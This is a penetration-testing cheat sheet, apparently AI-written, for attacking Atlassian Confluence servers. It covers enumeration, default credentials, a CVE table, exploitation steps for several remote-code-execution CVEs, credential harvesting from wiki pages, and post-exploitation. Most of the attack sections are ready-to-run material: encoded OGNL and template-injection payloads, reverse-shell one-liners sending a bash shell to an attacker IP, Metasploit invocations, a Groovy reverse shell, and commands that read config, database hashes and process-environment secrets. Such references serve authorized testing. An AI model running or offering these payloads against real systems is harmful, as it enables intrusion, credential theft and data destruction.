# Confluence

#Confluence #Atlassian #wiki #webservices #RCE #OGNL

## What is Confluence?
Atlassian's team wiki and collaboration platform. Widely deployed in enterprise environments and HTB Pro Labs. Primary attack surface: several critical unauthenticated RCE CVEs (OGNL injection, template injection) that are heavily tested. Also valuable for credential harvesting from wiki content.

- Port: **TCP 8090** — HTTP (default standalone)
- Port: **TCP 8091** — control port
- Port: **TCP 80/443** — when behind reverse proxy (common in prod)
- Config: `<confluence_home>/confluence.cfg.xml` — DB credentials
- Default install path: `/opt/atlassian/confluence/`
- Home dir: `/var/atlassian/application-data/confluence/`

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | Port/version fingerprint (`http-title`, banner on 8090/8091) |
| [[Tools/File Transfer/cURL\|cURL]] | Version fingerprint, REST API enum, all unauth-RCE PoCs, wiki credential search |
| [[Tools/Scanning/gobuster\|gobuster]] | Content/endpoint discovery |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `atlassian_confluence_*` OGNL/SSTI/config-restore RCE modules |
| [[Tools/Database/mysql\|mysql]] | Connect to the backend DB with config-file creds to dump `cwd_user` hashes |

---

## Enumeration

```bash
# Nmap
nmap -p 8090,8091 --script http-title,banner -sV <target>

# Version fingerprint (visible on login page + /rest/api/space)
curl -s http://<target>:8090/
curl -s http://<target>:8090/login.action | grep -i "version\|confluence\|ajs-version"
curl -s http://<target>:8090/rest/api/space | python3 -m json.tool   # public spaces (no auth)

# Check REST API (unauthenticated access)
curl -s http://<target>:8090/rest/api/user/current
curl -s http://<target>:8090/rest/api/space
curl -s "http://<target>:8090/rest/api/search?cql=type=page" | python3 -m json.tool

# Identify version (critical for CVE matching)
curl -s http://<target>:8090/rest/applinks/1.0/manifest | grep -i "version\|build"

# gobuster
gobuster dir -u http://<target>:8090 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

---

## Default / Common Credentials

```
admin / admin
admin / confluence
admin / password
admin / atlassian
confluence / confluence
```

---

## CVEs — Version Reference

| CVE | Versions Affected | Type | Auth Required |
|---|---|---|---|
| CVE-2023-22518 | All < 7.19.16, 8.3.x < 8.3.4, 8.4.x < 8.4.4, 8.5.x < 8.5.4, 8.6.0 | Improper authz → admin reset → RCE (CVSS 10) | No |
| CVE-2024-21683 | 5.2–8.9.0 (fixed 7.19.22/8.5.9/8.9.1) | "Add a New Language" → RCE | Yes (macro-lang perm) |
| CVE-2023-22527 | 8.0.x–8.5.3 (also 8.6.x–8.8.x in some builds) | SSTI → RCE | No |
| CVE-2022-26134 | All < 7.4.17, 7.13.x < 7.13.7, 7.14.x–7.18.x < 7.18.1 | OGNL injection → RCE | No |
| CVE-2021-26084 | < 6.13.23, 6.14.x–7.11.x < 7.11.6, 7.12.x < 7.12.5 | OGNL injection → RCE | Partial (some configs no auth) |
| CVE-2019-3396 | < 6.6.12, 6.7.x–6.12.x, 6.13.x < 6.13.3, 6.14.x < 6.14.2 | Path traversal → RCE | No |

---

## Attack Vectors

### CVE-2023-22518 — Unauthenticated Improper Authorization → Admin Reset → RCE

CVSS **10.0**, CISA KEV, exploited as a 0-day (Cerber ransomware). Unauthenticated access to the `setup-restore` administrative endpoints lets an attacker restore a crafted backup / reset the instance and create a new admin, then reach RCE (e.g. via the Groovy script console or a plugin upload once admin). Affects **all** Server/Data Center builds before the fixed versions; Atlassian Cloud is not affected.

```bash
# The vulnerable endpoints are the setup/restore actions reachable pre-auth:
#   /json/setup-restore.action
#   /json/setup-restore-local.action
#   /json/setup-restore-progress.action
# A malicious workflow: POST a crafted app-data/backup zip to setup-restore to
# overwrite the instance (data destruction) or seed an attacker admin account.

# Detect the endpoint responds without auth (should be 302→login on a patched build)
curl -sk -o /dev/null -w "%{http_code}\n" -X POST \
  "http://<target>:8090/json/setup-restore.action?synchronous=true" \
  -H "X-Atlassian-Token: no-check" -H "Content-Type: multipart/form-data"

# Metasploit (data-destruction / auth-bypass module)
use auxiliary/admin/http/atlassian_confluence_auth_bypass_cve_2023_22518
set RHOSTS <target>
set RPORT 8090
run
```

> [!warning] **This is a destructive primitive.** The public PoC path overwrites/resets the instance — in an authorized test, prefer the detection check and coordinate before running any restore. RCE is a *chained* step (admin → Groovy console / malicious plugin), not a single request.

### CVE-2022-26134 — Unauthenticated OGNL RCE

Affects all Confluence Server/Data Center versions before patched releases. OGNL expression injected via HTTP URI. Extremely reliable.

```bash
# PoC — execute command
curl -v http://<target>:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/

# URL-decoded payload: ${@java.lang.Runtime@getRuntime().exec("id")}

# Reverse shell (base64 encode the command to avoid special chars)
echo 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzkwMDEgMD4mMQo=

# Payload with base64 encoded reverse shell
curl -v "http://<target>:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28new+String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22bash+-i+>%26+/dev/tcp/<attacker_ip>/<port>+0>%261%22%7D%29%7D/"

# Metasploit
use exploit/multi/http/atlassian_confluence_namespace_ognl_injection
set RHOSTS <target>
set RPORT 8090
set LHOST <attacker_ip>
run

# Python PoC
python3 CVE-2022-26134.py -u http://<target>:8090 -c "id"
python3 CVE-2022-26134.py -u http://<target>:8090 -c "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"
```

### CVE-2023-22527 — Unauthenticated SSTI RCE

Template injection in Confluence 8.x via `/_edge/` or `/template/` endpoints. Most recent critical Confluence CVE.

```bash
# Check vulnerable endpoint
curl -s -X POST http://<target>:8090/template/aui/text-inline.vm \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "queryString=%5C%5Cu0027%2B%5B1337*1337%5D.class.forName%28%27java.lang.Runtime%27%29.getMethod%28%27exec%27%2C%5B%27%27.class.forName%28%27java.lang.String%27%29%5D%29.invoke%28null%2C%27id%27%29%2B%5C%5Cu0027"

# Metasploit
use exploit/multi/http/atlassian_confluence_ssti_rce
set RHOSTS <target>
set RPORT 8090
set LHOST <attacker_ip>
run

# Python PoC (various public repos):
python3 CVE-2023-22527.py --url http://<target>:8090 --cmd "id"
python3 CVE-2023-22527.py --url http://<target>:8090 \
  --cmd "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"
```

### CVE-2024-21683 — Authenticated RCE via "Add a New Language"

CVSS 8.3. A user with permission to add a code-macro language can upload a malicious JavaScript language definition; the `RhinoLanguageParser` allows Java class access, so `java.lang.Runtime.getRuntime().exec(...)` in the file runs on the host. Useful post-credential (default-creds, phished, or after harvesting a low-priv login) when no unauth path exists on a patched-ish build. Affects 5.2–8.9.0.

```bash
# Path: Confluence Admin → Configure Code Macro → Add a new language → upload malicious .js
# The uploaded JS reaches server-side RCE via Rhino Java bridge.

# Metasploit (handles auth + upload)
use exploit/multi/http/atlassian_confluence_rce_cve_2024_21683
set RHOSTS <target>
set RPORT 8090
set USERNAME <user>
set PASSWORD <pass>
set LHOST <attacker_ip>
run
```

### CVE-2021-26084 — OGNL Injection (Pre/Post Auth)

```bash
# Unauthenticated on some configs — POST to setup endpoint
curl -s -X POST "http://<target>:8090/pages/doenterpagevariables.action" \
  --data 'queryString=%5C%27%2B%7B%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%2C%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%7D%2B%5C%27'

# Metasploit
use exploit/multi/http/atlassian_confluence_webwork_ognl_injection
set RHOSTS <target>
set RPORT 8090
run
```

### CVE-2019-3396 — Path Traversal + Server-Side Template Injection → RCE

```bash
# Read arbitrary files (no auth required)
curl -s -X POST "http://<target>:8090/rest/tinymce/1/macro/preview" \
  -H "Content-Type: application/json" \
  -d '{"macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}'

# RCE via template injection after path traversal
# Multiple PoC scripts on GitHub for full chain
```

### Authenticated RCE — Script Console (Admin)

If admin credentials obtained:

```bash
# Confluence admin → General Configuration → Script Console (if Groovy plugin installed)
# Or via direct admin access to server-side macros

# Navigate: Admin → Script Console (Groovy)
def cmd = "id".execute()
println cmd.text

# Reverse shell
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"].execute()
```

### Credential Harvesting from Wiki Content

```bash
# After gaining access (or with stolen creds) — search for credentials in pages
curl -s "http://<target>:8090/rest/api/search?cql=text+%7E+%22password%22&limit=50" \
  -u <user>:<pass> | python3 -m json.tool

curl -s "http://<target>:8090/rest/api/search?cql=text+%7E+%22vpn%22+OR+text+%7E+%22credential%22&limit=50" \
  -u <user>:<pass>

# Browse all spaces for sensitive pages
curl -s "http://<target>:8090/rest/api/space" -u <user>:<pass> | python3 -m json.tool

# Search for specific content types
curl -s "http://<target>:8090/rest/api/search?cql=type=page+AND+title+%7E+%22password%22" \
  -u <user>:<pass>
```

---

## Post-Exploitation

```bash
# Config file — DB credentials
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
cat /opt/atlassian/confluence/confluence/WEB-INF/classes/confluence-init.properties

# DB credentials in config
grep -i "password\|jdbc\|database" /var/atlassian/application-data/confluence/confluence.cfg.xml

# Connect to DB with extracted creds
psql -h <db_host> -U <db_user> -d confluence   # PostgreSQL (common)
mysql -h <db_host> -u <db_user> -p <db_pass> confluence  # MySQL

# Confluence user table (PostgreSQL)
psql -h <db_host> -U confluenceuser -d confluence \
  -c "SELECT user_name, credential FROM cwd_user;"

# Hashes are Atlassian PKCS5S2 (PBKDF2) — harder to crack, but useful for PTH to other Atlassian tools

# Process environment (may contain tokens/secrets)
cat /proc/$(pgrep -f confluence)/environ | tr '\0' '\n'
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Unpatched version (pre-7.18.1, 8.x pre-8.5.4) | Unauthenticated RCE via CVE-2022-26134 / CVE-2023-22527 |
| Any build pre-8.5.4 / 7.19.16 reachable unauth | CVE-2023-22518 — instance reset, attacker-admin, data destruction |
| Low-priv users with code-macro-language permission | CVE-2024-21683 — authenticated RCE |
| Public access to spaces | Sensitive info in wiki pages |
| Default admin credentials | Admin access → RCE |
| DB exposed on network with config creds | Direct DB access |
| Groovy script console plugin installed | Admin → OS RCE |

---

## Quick Reference

| Goal | Command |
|---|---|
| Version check | `curl -s http://host:8090/login.action \| grep ajs-version` |
| CVE-2023-22518 auth-bypass (MSF) | `auxiliary/admin/http/atlassian_confluence_auth_bypass_cve_2023_22518` |
| CVE-2022-26134 (MSF) | `exploit/multi/http/atlassian_confluence_namespace_ognl_injection` |
| CVE-2023-22527 (MSF) | `exploit/multi/http/atlassian_confluence_ssti_rce` |
| CVE-2024-21683 authed RCE (MSF) | `exploit/multi/http/atlassian_confluence_rce_cve_2024_21683` |
| CVE-2021-26084 (MSF) | `exploit/multi/http/atlassian_confluence_webwork_ognl_injection` |
| Public space enum | `curl -s http://host:8090/rest/api/space` |
| Search for passwords | `curl -s "http://host:8090/rest/api/search?cql=text+%7E+%22password%22" -u user:pass` |
| Config file (DB creds) | `cat /var/atlassian/application-data/confluence/confluence.cfg.xml` |

---

*Created: 2026-07-13*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
